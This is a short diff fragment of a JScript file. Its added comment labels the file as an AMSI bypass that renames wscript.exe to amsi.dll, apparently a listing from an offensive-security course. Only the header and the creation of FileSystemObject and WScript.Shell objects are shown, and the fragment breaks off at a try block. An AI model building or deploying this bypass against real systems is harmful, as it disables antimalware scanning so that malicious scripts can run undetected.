@@ -1,3 +1,5 @@
+// 9.6.3 - Listing 75 - AMSI bypass that renames wscript.exe to amsi.dll
+
 var filesys= new ActiveXObject("Scripting.FileSystemObject");
 var sh = new ActiveXObject('WScript.Shell');
 try
